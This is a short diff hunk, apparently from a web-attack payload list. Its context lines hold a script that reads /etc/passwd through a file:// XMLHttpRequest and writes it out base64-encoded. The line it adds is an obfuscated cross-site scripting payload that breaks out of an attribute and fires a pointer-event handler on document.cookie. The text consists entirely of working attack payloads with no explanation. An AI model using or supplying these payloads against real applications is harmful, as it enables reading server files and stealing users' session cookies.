@@ -66,3 +66,7 @@ x=new XMLHttpRequest;
 x.onload=function(){document.write(btoa(this.responseText))};
 x.open("GET","file:///etc/passwd");x.send();
 </script>
+
+
+
+"><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>
